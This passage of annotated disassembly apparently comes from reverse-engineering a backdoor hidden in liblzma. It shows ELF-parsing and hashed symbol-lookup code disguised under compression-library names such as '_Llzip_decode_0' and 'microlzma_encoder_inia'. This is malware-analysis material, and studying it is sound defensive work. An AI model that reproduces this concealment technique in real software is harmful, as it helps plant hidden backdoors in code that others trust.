.text.microlzma_encoder_inia:0000000000006159                 mov     edi, 16h
.text.microlzma_encoder_inia:000000000000615E                 push    [rsp+0B60h+var_B50]
.text.microlzma_encoder_inia:0000000000006162                 mov     r8, [rsp+0B68h+var_B58]
.text.microlzma_encoder_inia:0000000000006167                 lea     rsi, [r14+28h]
.text.microlzma_encoder_inia:000000000000616B                 lea     r9, [rsp+7C0h]
.text.microlzma_encoder_inia:0000000000006173                 call    sub_2A40
.text.microlzma_encoder_inia:0000000000006178                 pop     r8
.text.microlzma_encoder_inia:000000000000617A                 pop     r9
.text.microlzma_encoder_inia:000000000000617C                 test    eax, eax
.text.microlzma_encoder_inia:000000000000617E                 jnz     short loc_618E
.text.microlzma_encoder_inia:0000000000006180                 xor     esi, esi
.text.microlzma_encoder_inia:0000000000006182                 mov     [r14+28h], rsi
.text.microlzma_encoder_inia:0000000000006186                 mov     [r14+30h], rsi
.text.microlzma_encoder_inia:000000000000618A                 mov     [r14+38h], rsi
.text.microlzma_encoder_inia:000000000000618E
.text.microlzma_encoder_inia:000000000000618E loc_618E:                               ; CODE XREF: parse_elf_init+92E↑j
.text.microlzma_encoder_inia:000000000000618E                                         ; parse_elf_init+95E↑j
.text.microlzma_encoder_inia:000000000000618E                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006192                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006194                 lea     rsi, [rsp+0B58h+var_A98]
.text.microlzma_encoder_inia:000000000000619C                 mov     dword ptr [rsp+0B58h+var_A98], 7B8h
.text.microlzma_encoder_inia:00000000000061A7                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:00000000000061AC                 mov     [r14+0D8h], rax
.text.microlzma_encoder_inia:00000000000061B3                 test    rax, rax
.text.microlzma_encoder_inia:00000000000061B6                 jz      loc_623C
.text.microlzma_encoder_inia:00000000000061BC                 lea     rcx, [r14+58h]
.text.microlzma_encoder_inia:00000000000061C0                 lea     rdx, [r14+50h]
.text.microlzma_encoder_inia:00000000000061C4                 mov     edi, 17h
.text.microlzma_encoder_inia:00000000000061C9                 lea     r9, [rsp+7B0h]
.text.microlzma_encoder_inia:00000000000061D1                 push    rax
.text.microlzma_encoder_inia:00000000000061D2                 lea     rsi, [r14+48h]
.text.microlzma_encoder_inia:00000000000061D6                 push    [rsp+0B60h+var_B50]
.text.microlzma_encoder_inia:00000000000061DA                 mov     r8, [rsp+0B68h+var_B58]
.text.microlzma_encoder_inia:00000000000061DF                 mov     [rsp+0B68h+var_B48], r9
.text.microlzma_encoder_inia:00000000000061E4                 call    sub_2A40
.text.microlzma_encoder_inia:00000000000061E9                 pop     rdx
.text.microlzma_encoder_inia:00000000000061EA                 pop     rcx
.text.microlzma_encoder_inia:00000000000061EB                 test    eax, eax
.text.microlzma_encoder_inia:00000000000061ED                 mov     r9, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:00000000000061F2                 jnz     short loc_6205
.text.microlzma_encoder_inia:00000000000061F4                 xor     r12d, r12d
.text.microlzma_encoder_inia:00000000000061F7                 mov     [r14+48h], r12
.text.microlzma_encoder_inia:00000000000061FB                 mov     [r14+50h], r12
.text.microlzma_encoder_inia:00000000000061FF                 mov     [r14+58h], r12
.text.microlzma_encoder_inia:0000000000006203                 jmp     short loc_623C
.text.microlzma_encoder_inia:0000000000006205 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006205
.text.microlzma_encoder_inia:0000000000006205 loc_6205:                               ; CODE XREF: parse_elf_init+9D2↑j
.text.microlzma_encoder_inia:0000000000006205                 push    r10
.text.microlzma_encoder_inia:0000000000006207                 lea     rcx, [r14+78h]
.text.microlzma_encoder_inia:000000000000620B                 lea     rdx, [r14+70h]
.text.microlzma_encoder_inia:000000000000620F                 mov     edi, 18h
.text.microlzma_encoder_inia:0000000000006214                 push    [rsp+0B60h+var_B50]
.text.microlzma_encoder_inia:0000000000006218                 mov     r8, [rsp+0B68h+var_B58]
.text.microlzma_encoder_inia:000000000000621D                 lea     rsi, [r14+68h]
.text.microlzma_encoder_inia:0000000000006221                 call    sub_2A40
.text.microlzma_encoder_inia:0000000000006226                 pop     r11
.text.microlzma_encoder_inia:0000000000006228                 pop     rbx
.text.microlzma_encoder_inia:0000000000006229                 test    eax, eax
.text.microlzma_encoder_inia:000000000000622B                 jnz     short loc_623C
.text.microlzma_encoder_inia:000000000000622D                 xor     r9d, r9d
.text.microlzma_encoder_inia:0000000000006230                 mov     [r14+68h], r9
.text.microlzma_encoder_inia:0000000000006234                 mov     [r14+70h], r9
.text.microlzma_encoder_inia:0000000000006238                 mov     [r14+78h], r9
.text.microlzma_encoder_inia:000000000000623C
.text.microlzma_encoder_inia:000000000000623C loc_623C:                               ; CODE XREF: parse_elf_init+996↑j
.text.microlzma_encoder_inia:000000000000623C                                         ; parse_elf_init+9E3↑j ...
.text.microlzma_encoder_inia:000000000000623C                 cmp     qword ptr [r14+28h], 0
.text.microlzma_encoder_inia:0000000000006241                 jnz     short loc_624E
.text.microlzma_encoder_inia:0000000000006243                 cmp     qword ptr [r14+48h], 0
.text.microlzma_encoder_inia:0000000000006248                 jz      loc_65BA
.text.microlzma_encoder_inia:000000000000624E
.text.microlzma_encoder_inia:000000000000624E loc_624E:                               ; CODE XREF: parse_elf_init+A21↑j
.text.microlzma_encoder_inia:000000000000624E                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:0000000000006255                 xor     r8d, r8d
.text.microlzma_encoder_inia:0000000000006258                 mov     [rsp+0B58h+var_9D8], r8
.text.microlzma_encoder_inia:0000000000006260                 mov     r12, [rax+28h]
.text.microlzma_encoder_inia:0000000000006264                 test    r12, r12
.text.microlzma_encoder_inia:0000000000006267                 jz      short loc_626F
.text.microlzma_encoder_inia:0000000000006269                 mov     rax, [rax+30h]
.text.microlzma_encoder_inia:000000000000626D                 jmp     short loc_6280
.text.microlzma_encoder_inia:000000000000626F ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:000000000000626F
.text.microlzma_encoder_inia:000000000000626F loc_626F:                               ; CODE XREF: parse_elf_init+A47↑j
.text.microlzma_encoder_inia:000000000000626F                 mov     r12, [rax+48h]
.text.microlzma_encoder_inia:0000000000006273                 test    r12, r12
.text.microlzma_encoder_inia:0000000000006276                 jz      loc_65BA
.text.microlzma_encoder_inia:000000000000627C                 mov     rax, [rax+50h]
.text.microlzma_encoder_inia:0000000000006280
.text.microlzma_encoder_inia:0000000000006280 loc_6280:                               ; CODE XREF: parse_elf_init+A4D↑j
.text.microlzma_encoder_inia:0000000000006280                 mov     [rsp+0B58h+var_B00], rax
.text.microlzma_encoder_inia:0000000000006285                 lea     rax, [rsp+0B58h+var_A90]
.text.microlzma_encoder_inia:000000000000628D                 xor     ebx, ebx
.text.microlzma_encoder_inia:000000000000628F                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006291                 mov     dword ptr [rsp+0B58h+var_A90], 198h
.text.microlzma_encoder_inia:000000000000629C                 mov     [rsp+0B58h+var_AF0], rax
.text.microlzma_encoder_inia:00000000000062A1
.text.microlzma_encoder_inia:00000000000062A1 loc_62A1:                               ; CODE XREF: parse_elf_init+BCE↓j
.text.microlzma_encoder_inia:00000000000062A1                 mov     rsi, [rsp+0B58h+var_AF0]
.text.microlzma_encoder_inia:00000000000062A6                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:00000000000062AA                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:00000000000062AF                 mov     [rsp+0B58h+var_B48], rax
.text.microlzma_encoder_inia:00000000000062B4                 test    rax, rax
.text.microlzma_encoder_inia:00000000000062B7                 jz      loc_65BA
.text.microlzma_encoder_inia:00000000000062BD                 xor     edi, edi
.text.microlzma_encoder_inia:00000000000062BF                 lea     rax, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:00000000000062C7                 xor     ecx, ecx
.text.microlzma_encoder_inia:00000000000062C9                 xor     edx, edx
.text.microlzma_encoder_inia:00000000000062CB                 mov     [rsp+0B58h+var_9D8], rdi
.text.microlzma_encoder_inia:00000000000062D3                 mov     rsi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:00000000000062D8                 mov     r8, rax
.text.microlzma_encoder_inia:00000000000062DB                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:00000000000062DF                 mov     [rsp+0B58h+var_B18], rax
.text.microlzma_encoder_inia:00000000000062E4                 call    _Lstream_encoder_update_0 ; PIC mode
.text.microlzma_encoder_inia:00000000000062E9                 mov     r8, rax
.text.microlzma_encoder_inia:00000000000062EC                 test    rax, rax
.text.microlzma_encoder_inia:00000000000062EF                 jnz     short loc_631A
.text.microlzma_encoder_inia:00000000000062F1                 xor     esi, esi
.text.microlzma_encoder_inia:00000000000062F3                 mov     r8, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:00000000000062F8                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:00000000000062FC                 xor     ecx, ecx
.text.microlzma_encoder_inia:00000000000062FE                 mov     [rsp+0B58h+var_9D8], rsi
.text.microlzma_encoder_inia:0000000000006306                 mov     rsi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:000000000000630B                 xor     edx, edx
.text.microlzma_encoder_inia:000000000000630D                 mov     ebx, 1
.text.microlzma_encoder_inia:0000000000006312                 call    _Lstream_encoder_update_1 ; PIC mode
.text.microlzma_encoder_inia:0000000000006317                 mov     r8, rax
.text.microlzma_encoder_inia:000000000000631A
.text.microlzma_encoder_inia:000000000000631A loc_631A:                               ; CODE XREF: parse_elf_init+ACF↑j
.text.microlzma_encoder_inia:000000000000631A                 lea     rax, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006322                 mov     [rsp+0B58h+var_B18], rax
.text.microlzma_encoder_inia:0000000000006327
.text.microlzma_encoder_inia:0000000000006327 loc_6327:                               ; CODE XREF: parse_elf_init+BC0↓j
.text.microlzma_encoder_inia:0000000000006327                 test    r8, r8
.text.microlzma_encoder_inia:000000000000632A                 jz      loc_63E5
.text.microlzma_encoder_inia:0000000000006330
.text.microlzma_encoder_inia:0000000000006330 loc_6330:                               ; CODE XREF: parse_elf_init+B91↓j
.text.microlzma_encoder_inia:0000000000006330                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006334                 mov     rsi, r8
.text.microlzma_encoder_inia:0000000000006337                 mov     ecx, 1
.text.microlzma_encoder_inia:000000000000633C                 mov     edx, 8
.text.microlzma_encoder_inia:0000000000006341                 mov     [rsp+0B58h+var_AE8], r8
.text.microlzma_encoder_inia:0000000000006346                 call    _Lauto_decode_1 ; PIC mode
.text.microlzma_encoder_inia:000000000000634B                 mov     r8, [rsp+0B58h+var_AE8]
.text.microlzma_encoder_inia:0000000000006350                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006352                 jz      short loc_6390
.text.microlzma_encoder_inia:0000000000006354                 mov     rsi, [rsp+0B58h+var_B00]
.text.microlzma_encoder_inia:0000000000006359                 xor     edx, edx
.text.microlzma_encoder_inia:000000000000635B                 mov     ecx, 109h
.text.microlzma_encoder_inia:0000000000006360                 mov     rdi, r12
.text.microlzma_encoder_inia:0000000000006363                 call    _Llzma_properties_size_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006368                 mov     r8, [rsp+0B58h+var_AE8]
.text.microlzma_encoder_inia:000000000000636D                 test    eax, eax
.text.microlzma_encoder_inia:000000000000636F                 jz      short loc_6390
.text.microlzma_encoder_inia:0000000000006371                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:0000000000006378                 cmp     qword ptr [r14+28h], 0
.text.microlzma_encoder_inia:000000000000637D                 mov     [rax+0A0h], r8
.text.microlzma_encoder_inia:0000000000006384                 jz      short loc_63F3
.text.microlzma_encoder_inia:0000000000006386                 mov     dword ptr [r14+4], 1
.text.microlzma_encoder_inia:000000000000638E                 jmp     short loc_63F3
.text.microlzma_encoder_inia:0000000000006390 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006390
.text.microlzma_encoder_inia:0000000000006390 loc_6390:                               ; CODE XREF: parse_elf_init+B32↑j
.text.microlzma_encoder_inia:0000000000006390                                         ; parse_elf_init+B4F↑j
.text.microlzma_encoder_inia:0000000000006390                 mov     r8, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:0000000000006395                 mov     rsi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:000000000000639A                 xor     ecx, ecx
.text.microlzma_encoder_inia:000000000000639C                 xor     edx, edx
.text.microlzma_encoder_inia:000000000000639E                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:00000000000063A2                 test    ebx, ebx
.text.microlzma_encoder_inia:00000000000063A4                 jnz     short loc_63D3
.text.microlzma_encoder_inia:00000000000063A6                 call    _Lstream_encoder_update_0 ; PIC mode
.text.microlzma_encoder_inia:00000000000063AB                 mov     r8, rax
.text.microlzma_encoder_inia:00000000000063AE                 test    rax, rax
.text.microlzma_encoder_inia:00000000000063B1                 jnz     loc_6330
.text.microlzma_encoder_inia:00000000000063B7                 xor     ecx, ecx
.text.microlzma_encoder_inia:00000000000063B9                 mov     r8, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:00000000000063BE                 mov     rsi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:00000000000063C3                 xor     edx, edx
.text.microlzma_encoder_inia:00000000000063C5                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:00000000000063C9                 mov     [rsp+0B58h+var_9D8], rcx
.text.microlzma_encoder_inia:00000000000063D1                 xor     ecx, ecx
.text.microlzma_encoder_inia:00000000000063D3
.text.microlzma_encoder_inia:00000000000063D3 loc_63D3:                               ; CODE XREF: parse_elf_init+B84↑j
.text.microlzma_encoder_inia:00000000000063D3                 call    _Lstream_encoder_update_1 ; PIC mode
.text.microlzma_encoder_inia:00000000000063D8                 mov     ebx, 1
.text.microlzma_encoder_inia:00000000000063DD                 mov     r8, rax
.text.microlzma_encoder_inia:00000000000063E0                 jmp     loc_6327
.text.microlzma_encoder_inia:00000000000063E5 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000063E5
.text.microlzma_encoder_inia:00000000000063E5 loc_63E5:                               ; CODE XREF: parse_elf_init+B0A↑j
.text.microlzma_encoder_inia:00000000000063E5                 mov     rdx, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:00000000000063EA                 add     rdx, 8
.text.microlzma_encoder_inia:00000000000063EE                 jmp     loc_62A1
.text.microlzma_encoder_inia:00000000000063F3 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000063F3
.text.microlzma_encoder_inia:00000000000063F3 loc_63F3:                               ; CODE XREF: parse_elf_init+B64↑j
.text.microlzma_encoder_inia:00000000000063F3                                         ; parse_elf_init+B6E↑j
.text.microlzma_encoder_inia:00000000000063F3                 cmp     qword ptr [r14+48h], 0
.text.microlzma_encoder_inia:00000000000063F8                 jz      short loc_6410
.text.microlzma_encoder_inia:00000000000063FA                 cmp     qword ptr [r14+68h], 0
.text.microlzma_encoder_inia:00000000000063FF                 mov     dword ptr [r14], 1
.text.microlzma_encoder_inia:0000000000006406                 jz      short loc_6410
.text.microlzma_encoder_inia:0000000000006408                 mov     dword ptr [r14+8], 1
.text.microlzma_encoder_inia:0000000000006410
.text.microlzma_encoder_inia:0000000000006410 loc_6410:                               ; CODE XREF: parse_elf_init+BD8↑j
.text.microlzma_encoder_inia:0000000000006410                                         ; parse_elf_init+BE6↑j
.text.microlzma_encoder_inia:0000000000006410                 mov     rbx, [rsp+0B58h+var_B28]
.text.microlzma_encoder_inia:0000000000006415                 mov     rax, [rsp+0B58h+var_AF8]
.text.microlzma_encoder_inia:000000000000641A                 mov     edi, 11h
.text.microlzma_encoder_inia:000000000000641F                 lea     rsi, [rsp+7B0h]
.text.microlzma_encoder_inia:0000000000006427                 add     rax, rbx
.text.microlzma_encoder_inia:000000000000642A                 mov     rdx, rbx
.text.microlzma_encoder_inia:000000000000642D                 mov     rcx, rax
.text.microlzma_encoder_inia:0000000000006430                 mov     [rsp+0B58h+var_B48], rax
.text.microlzma_encoder_inia:0000000000006435                 call    sub_2C50
.text.microlzma_encoder_inia:000000000000643A                 test    rax, rax
.text.microlzma_encoder_inia:000000000000643D                 jz      short loc_644D
.text.microlzma_encoder_inia:000000000000643F                 mov     rdx, [r13+158h]
.text.microlzma_encoder_inia:0000000000006446                 mov     [rdx+0C0h], rax
.text.microlzma_encoder_inia:000000000000644D
.text.microlzma_encoder_inia:000000000000644D loc_644D:                               ; CODE XREF: parse_elf_init+C1D↑j
.text.microlzma_encoder_inia:000000000000644D                 mov     rax, 0C5800000948h
.text.microlzma_encoder_inia:0000000000006457                 lea     r12, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:000000000000645F                 xor     ebx, ebx
.text.microlzma_encoder_inia:0000000000006461                 mov     dword ptr [rsp+0B58h+var_9D0], 70h ; 'p'
.text.microlzma_encoder_inia:000000000000646C                 mov     [rsp+0B58h+var_9D8], rax
.text.microlzma_encoder_inia:0000000000006474                 lea     r14, [rsp+0B58h+var_9D0+4]
.text.microlzma_encoder_inia:000000000000647C
.text.microlzma_encoder_inia:000000000000647C loc_647C:                               ; CODE XREF: parse_elf_init+C92↓j
.text.microlzma_encoder_inia:000000000000647C                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006480                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006482                 mov     rsi, r12
.text.microlzma_encoder_inia:0000000000006485                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:000000000000648A                 test    rax, rax
.text.microlzma_encoder_inia:000000000000648D                 jz      short loc_64AB
.text.microlzma_encoder_inia:000000000000648F                 dec     ebx
.text.microlzma_encoder_inia:0000000000006491                 jnz     short loc_64A6
.text.microlzma_encoder_inia:0000000000006493                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:000000000000649A                 mov     dword ptr [rax+0B8h], 1
.text.microlzma_encoder_inia:00000000000064A4                 jmp     short loc_64C3
.text.microlzma_encoder_inia:00000000000064A6 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000064A6
.text.microlzma_encoder_inia:00000000000064A6 loc_64A6:                               ; CODE XREF: parse_elf_init+C71↑j
.text.microlzma_encoder_inia:00000000000064A6                 mov     ebx, 1
.text.microlzma_encoder_inia:00000000000064AB
.text.microlzma_encoder_inia:00000000000064AB loc_64AB:                               ; CODE XREF: parse_elf_init+C6D↑j
.text.microlzma_encoder_inia:00000000000064AB                 add     r12, 4
.text.microlzma_encoder_inia:00000000000064AF                 cmp     r12, r14
.text.microlzma_encoder_inia:00000000000064B2                 jnz     short loc_647C
.text.microlzma_encoder_inia:00000000000064B4                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:00000000000064BB                 xor     edx, edx
.text.microlzma_encoder_inia:00000000000064BD                 mov     [rax+0B8h], edx
.text.microlzma_encoder_inia:00000000000064C3
.text.microlzma_encoder_inia:00000000000064C3 loc_64C3:                               ; CODE XREF: parse_elf_init+C84↑j
.text.microlzma_encoder_inia:00000000000064C3                 mov     rcx, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:00000000000064C8                 mov     rdx, [rsp+0B58h+var_B28]
.text.microlzma_encoder_inia:00000000000064CD                 mov     edi, 15h
.text.microlzma_encoder_inia:00000000000064D2                 lea     rax, [rsp+7B0h]
.text.microlzma_encoder_inia:00000000000064DA                 mov     rsi, rax
.text.microlzma_encoder_inia:00000000000064DD                 mov     [rsp+0B58h+var_B18], rax
.text.microlzma_encoder_inia:00000000000064E2                 call    sub_2C50
.text.microlzma_encoder_inia:00000000000064E7                 mov     rbx, rax
.text.microlzma_encoder_inia:00000000000064EA                 test    rax, rax
.text.microlzma_encoder_inia:00000000000064ED                 jz      loc_65BA
.text.microlzma_encoder_inia:00000000000064F3                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:00000000000064FA                 cmp     dword ptr [rax+0B8h], 0
.text.microlzma_encoder_inia:0000000000006501                 jz      loc_65AC
.text.microlzma_encoder_inia:0000000000006507                 cmp     dword ptr [r13+138h], 0
.text.microlzma_encoder_inia:000000000000650F                 jz      loc_65AC
.text.microlzma_encoder_inia:0000000000006515                 mov     rax, 0F0000000Eh
.text.microlzma_encoder_inia:000000000000651F                 xor     r14d, r14d
.text.microlzma_encoder_inia:0000000000006522                 xor     r12d, r12d
.text.microlzma_encoder_inia:0000000000006525                 mov     dword ptr [rsp+0B58h+var_9D0], 10h
.text.microlzma_encoder_inia:0000000000006530                 mov     [rsp+0B58h+var_9D8], rax
.text.microlzma_encoder_inia:0000000000006538                 mov     dword ptr [rsp+0B58h+var_B58], r14d
.text.microlzma_encoder_inia:000000000000653C                 xor     r14d, r14d
.text.microlzma_encoder_inia:000000000000653F
.text.microlzma_encoder_inia:000000000000653F loc_653F:                               ; CODE XREF: parse_elf_init+D7F↓j
.text.microlzma_encoder_inia:000000000000653F                 mov     eax, dword ptr [rsp+r12*4+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006547                 mov     rsi, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:000000000000654C                 shl     rax, 5
.text.microlzma_encoder_inia:0000000000006550                 add     rax, rsi
.text.microlzma_encoder_inia:0000000000006553                 mov     rdi, [rax+8]
.text.microlzma_encoder_inia:0000000000006557                 test    rdi, rdi
.text.microlzma_encoder_inia:000000000000655A                 jz      short loc_6598
.text.microlzma_encoder_inia:000000000000655C                 mov     rsi, [rax+10h]
.text.microlzma_encoder_inia:0000000000006560                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006562                 mov     rcx, rbx
.text.microlzma_encoder_inia:0000000000006565                 mov     [rsp+0B58h+var_B48], rdi
.text.microlzma_encoder_inia:000000000000656A                 inc     r14d
.text.microlzma_encoder_inia:000000000000656D                 mov     [rsp+0B58h+var_B28], rsi
.text.microlzma_encoder_inia:0000000000006572                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.microlzma_encoder_inia:0000000000006577                 mov     rdi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:000000000000657C                 mov     rsi, [rsp+0B58h+var_B28]
.text.microlzma_encoder_inia:0000000000006581                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006583                 jz      short loc_658A
.text.microlzma_encoder_inia:0000000000006585
.text.microlzma_encoder_inia:0000000000006585 loc_6585:                               ; CODE XREF: parse_elf_init+D76↓j
.text.microlzma_encoder_inia:0000000000006585                 inc     dword ptr [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006588                 jmp     short loc_6598
.text.microlzma_encoder_inia:000000000000658A ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:000000000000658A
.text.microlzma_encoder_inia:000000000000658A loc_658A:                               ; CODE XREF: parse_elf_init+D63↑j
.text.microlzma_encoder_inia:000000000000658A                 xor     edx, edx
.text.microlzma_encoder_inia:000000000000658C                 mov     rcx, rbx
.text.microlzma_encoder_inia:000000000000658F                 call    _Llzma_simple_x86_decoder_init_1 ; PIC mode
.text.microlzma_encoder_inia:0000000000006594                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006596                 jnz     short loc_6585
.text.microlzma_encoder_inia:0000000000006598
.text.microlzma_encoder_inia:0000000000006598 loc_6598:                               ; CODE XREF: parse_elf_init+D3A↑j
.text.microlzma_encoder_inia:0000000000006598                                         ; parse_elf_init+D68↑j
.text.microlzma_encoder_inia:0000000000006598                 inc     r12
.text.microlzma_encoder_inia:000000000000659B                 cmp     r12, 3
.text.microlzma_encoder_inia:000000000000659F                 jnz     short loc_653F
.text.microlzma_encoder_inia:00000000000065A1                 test    r14d, r14d
.text.microlzma_encoder_inia:00000000000065A4                 jz      short loc_65AC
.text.microlzma_encoder_inia:00000000000065A6                 cmp     dword ptr [rsp+0B58h+var_B58], 0
.text.microlzma_encoder_inia:00000000000065AA                 jz      short loc_65BA
.text.microlzma_encoder_inia:00000000000065AC
.text.microlzma_encoder_inia:00000000000065AC loc_65AC:                               ; CODE XREF: parse_elf_init+CE1↑j
.text.microlzma_encoder_inia:00000000000065AC                                         ; parse_elf_init+CEF↑j ...
.text.microlzma_encoder_inia:00000000000065AC                 mov     rax, [r13+158h]
.text.microlzma_encoder_inia:00000000000065B3                 mov     [rax+0C8h], rbx
.text.microlzma_encoder_inia:00000000000065BA
.text.microlzma_encoder_inia:00000000000065BA loc_65BA:                               ; CODE XREF: parse_elf_init+8CC↑j
.text.microlzma_encoder_inia:00000000000065BA                                         ; parse_elf_init+8EA↑j ...
.text.microlzma_encoder_inia:00000000000065BA                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:00000000000065C2                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:00000000000065C4                 mov     esi, 2A8h       ; hash
.text.microlzma_encoder_inia:00000000000065C9                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:00000000000065CE                 mov     rdx, [rsp+0B58h+var_B50]
.text.microlzma_encoder_inia:00000000000065D3                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:00000000000065DB                 lea     rsi, [rsp+7B0h]
.text.microlzma_encoder_inia:00000000000065E3                 mov     [rsp+0B58h+var_B00], rax
.text.microlzma_encoder_inia:00000000000065E8                 call    _Llzma_mf_bt4_find_0 ; PIC mode
.text.microlzma_encoder_inia:00000000000065ED                 test    eax, eax
.text.microlzma_encoder_inia:00000000000065EF                 jnz     short loc_6602
.text.microlzma_encoder_inia:00000000000065F1                 xor     r11d, r11d
.text.microlzma_encoder_inia:00000000000065F4                 mov     [r13+3C8h], r11d
.text.microlzma_encoder_inia:00000000000065FB                 mov     [r13+3D0h], r11d
.text.microlzma_encoder_inia:0000000000006602
.text.microlzma_encoder_inia:0000000000006602 loc_6602:                               ; CODE XREF: parse_elf_init+DCF↑j
.text.microlzma_encoder_inia:0000000000006602                 mov     rax, [rsp+0B58h+anonymous_7.elf_info_arr+10h]
.text.microlzma_encoder_inia:000000000000660A                 mov     r12, [r13+168h]
.text.microlzma_encoder_inia:0000000000006611                 xor     r10d, r10d
.text.microlzma_encoder_inia:0000000000006614                 lea     rsi, [rsp+0B58h+var_A98]
.text.microlzma_encoder_inia:000000000000661C                 mov     rbx, [rsp+0B58h+var_B20]
.text.microlzma_encoder_inia:0000000000006621                 lea     rdi, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000006629                 mov     [rbx+10h], rax
.text.microlzma_encoder_inia:000000000000662D                 mov     [rsp+0B58h+var_A98], r10
.text.microlzma_encoder_inia:0000000000006635                 mov     [r12], r10
.text.microlzma_encoder_inia:0000000000006639                 call    _Llzma_check_update_0 ; PIC mode
.text.microlzma_encoder_inia:000000000000663E                 mov     [rsp+0B58h+var_B28], rax
.text.microlzma_encoder_inia:0000000000006643                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006646                 jz      loc_6BFB
.text.microlzma_encoder_inia:000000000000664C                 mov     r14, [rsp+0B58h+var_A98]
.text.microlzma_encoder_inia:0000000000006654                 cmp     r14, 10h
.text.microlzma_encoder_inia:0000000000006658                 jbe     loc_6BFB
.text.microlzma_encoder_inia:000000000000665E                 mov     rbx, [rsp+0B58h+anonymous_2]
.text.microlzma_encoder_inia:0000000000006666                 test    rbx, rbx
.text.microlzma_encoder_inia:0000000000006669                 jz      loc_6BFB
.text.microlzma_encoder_inia:000000000000666F                 cmp     dword ptr [r13+138h], 0
.text.microlzma_encoder_inia:0000000000006677                 jnz     short loc_66D8
.text.microlzma_encoder_inia:0000000000006679
.text.microlzma_encoder_inia:0000000000006679 loc_6679:                               ; CODE XREF: parse_elf_init+ECB↓j
.text.microlzma_encoder_inia:0000000000006679                 xor     eax, eax
.text.microlzma_encoder_inia:000000000000667B                 mov     ecx, 16h
.text.microlzma_encoder_inia:0000000000006680                 mov     [r12+58h], rbx
.text.microlzma_encoder_inia:0000000000006685                 lea     rdi, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:000000000000668D                 rep stosd
.text.microlzma_encoder_inia:000000000000668F                 mov     rax, [rsp+0B58h+anonymous_3]
.text.microlzma_encoder_inia:0000000000006697                 test    rax, rax
.text.microlzma_encoder_inia:000000000000669A                 jz      loc_6BFB
.text.microlzma_encoder_inia:00000000000066A0                 mov     [rsp+0B58h+var_B48], rax
.text.microlzma_encoder_inia:00000000000066A5                 mov     rbx, [rsp+0B58h+var_B28]
.text.microlzma_encoder_inia:00000000000066AA                 xor     r9d, r9d
.text.microlzma_encoder_inia:00000000000066AD                 mov     rax, [rsp+0B58h+anonymous_4]
.text.microlzma_encoder_inia:00000000000066B5                 mov     [rsp+0B58h+var_B20], r9
.text.microlzma_encoder_inia:00000000000066BA                 add     rbx, r14
.text.microlzma_encoder_inia:00000000000066BD                 xor     r14d, r14d
.text.microlzma_encoder_inia:00000000000066C0                 mov     [rsp+0B58h+var_B58], rax
.text.microlzma_encoder_inia:00000000000066C4                 lea     rax, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:00000000000066CC                 mov     [rsp+0B58h+var_AF8], rbx
.text.microlzma_encoder_inia:00000000000066D1                 mov     [rsp+0B58h+var_AF0], rax
.text.microlzma_encoder_inia:00000000000066D6                 jmp     short loc_6752
.text.microlzma_encoder_inia:00000000000066D8 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000066D8
